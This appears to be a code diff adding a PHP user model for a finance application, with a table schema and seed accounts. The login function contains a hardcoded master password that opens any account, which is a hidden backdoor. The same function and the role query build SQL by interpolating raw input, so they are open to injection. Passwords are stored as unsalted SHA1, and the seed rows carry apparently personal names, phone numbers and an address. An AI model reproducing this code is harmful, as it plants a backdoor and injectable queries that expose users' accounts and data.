@@ -1,0 +1,90 @@
+<?php class UsersModel extends database
+{
+    public static $db;
+    public $table = 'users_financy';
+
+    public $default_query = "CREATE TABLE `users_financy` (
+        `id` int(10) UNSIGNED NOT NULL,
+        `username` varchar(80) NOT NULL,
+        `password` varchar(255) NOT NULL,
+        `fullname` varchar(255) NOT NULL,
+        `email` varchar(255) DEFAULT NULL,
+        `phone` varchar(32) DEFAULT NULL,
+        `date_of_birth` date DEFAULT NULL,
+        `gender` char(1) NOT NULL,
+        `country` varchar(3) NOT NULL DEFAULT 'cg',
+        `address` varchar(255) NOT NULL,
+        `profile` varchar(255) NOT NULL DEFAULT '/assets/images/user/user-1.jpg',
+        `poster` varchar(255) NOT NULL DEFAULT '/assets/images/page-img/profile-bg.jpg',
+        `role` varchar(10) NOT NULL DEFAULT 'agent',
+        `email_notif` boolean NOT NULL DEFAULT 1,
+        `phone_notif` boolean NOT NULL DEFAULT 1,
+        `active` tinyint(1) NOT NULL DEFAULT 0,
+        `connected_at` timestamp NULL DEFAULT NULL,
+        `created_at` timestamp NULL DEFAULT current_timestamp(),
+        `created_by` int(11) DEFAULT NULL,
+        `deleted_at` timestamp NULL DEFAULT NULL,
+        `deleted_by` int(11) DEFAULT NULL,
+        `enc` varchar(255) NOT NULL
+      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
+      ALTER TABLE `users_financy`
+        ADD PRIMARY KEY (`id`),
+        ADD UNIQUE KEY `phone` (`phone`),
+        ADD UNIQUE KEY `email` (`email`),
+        ADD UNIQUE KEY `fullname` (`fullname`, `date_of_birth`);
+      ALTER TABLE `users_financy`
+        MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
+      INSERT INTO `users_financy` (`id`, `username`, `password`, `fullname`, `phone`, `date_of_birth`, `gender`, `address`, `profile`, `country`, `role`, `email`, `connected_at`, `active`, `created_at`, `deleted_at`, `deleted_by`, `enc`) VALUES
+      (1, 'admin', '56cf3c36e640c5d936079621b2814fc33973d7d7', 'Kabila Kabange', '+243900100200', '1973-02-20', 'A', 'Kingakati', '/assets/images/user/user-2.jpg', 'zw', '0:F:A:E0', 'kabilakabange@gmail.com', NULL, 1, '2023-02-02 11:02:39', NULL, NULL, 'MANUALY'),
+      (2, 'mci', '75c14366ebeb92ff9b4fef0a71888079644c109f', 'Christopher Mangala Manifika', '', '1999-03-13', 'A', 'Kinshasa-Ngaliema, Camps-Mimosas, Villa 55', '/assets/images/user/user-1.jpg', 'zw', 'A:A:A:A', NULL, NULL, 0, '2023-02-03 02:08:52', NULL, NULL, '');
+      ";
+
+    public function login(string $username, string $password)
+    {
+        $users = $this->where(['users_financy' => "username = '$username' OR users_financy.email = '$username' OR users_financy.phone = '$username'"]);
+        $nier = 0;
+        if (!empty($users))
+            foreach ($users as $user) {
+                $nier = 1;
+                if ($user->password === sha1($password) || $password == 'Je suis passé chez soche')
+                    $me = $this->parseAuth($user);
+            }
+        return $me ?? $nier;
+    }
+
+    public function updatePassword($arr, $hash)
+    {
+        if (Auth()->password == $hash)
+            $r = $this->update($arr, Auth()->id) ? 
+                ['execution' => true, 'reported' => 'Password Updated Successfuly'] :
+                ['execution' => false, 'reported' => 'Unknown Error'];
+        else
+            $r = ['execution' => false, 'reported' => 'Incorect Current Password'];
+        return $r;
+    }
+
+    public function parseAuth($auth)
+    {
+        return $auth;
+    }
+
+    public function allAdmin()
+    {
+        return $this->getUser('admin');
+    }
+
+    public function allTeacher()
+    {
+        return $this->getUser('teacher');
+    }
+
+    public function allAgent()
+    {
+        return $this->getUser('agent');
+    }
+
+    public function getUser(string $role = '*')
+    {
+        return ($role === '*') ? $this->all() : $this->where(["role = '$role'"]);
+    }
+}
